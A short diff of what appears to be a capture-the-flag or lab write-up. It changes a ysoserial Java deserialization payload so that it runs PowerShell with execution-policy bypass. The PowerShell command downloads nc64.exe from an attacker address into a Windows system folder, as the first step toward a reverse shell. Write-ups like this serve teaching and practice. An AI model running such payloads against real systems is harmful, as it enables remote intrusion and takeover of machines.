@@ -391,7 +391,7 @@ Now we need to find a working payload for a reverse shell. At first i tried to h
 So instead i decided to download `nc64.exe` to the target with:
 
 ```bash
-java -jar ysoserial-all.jar CommonsCollections6 'powershell -exec bypass -c Invoke-WebRequest -uri "http://10.10.14.61/nc64.exe" -outfile \windows\System32\spool\drivers\color\n.exe' > payload.bin
+java -jar ysoserial-all.jar CommonsCollections5 'powershell -exec bypass -c Invoke-WebRequest -uri "http://10.10.14.61/nc64.exe" -outfile \windows\System32\spool\drivers\color\n.exe' > payload.bin
 ```
 
 This worked, as the target retrieved the file. Then i setup the reverse shell payload with:
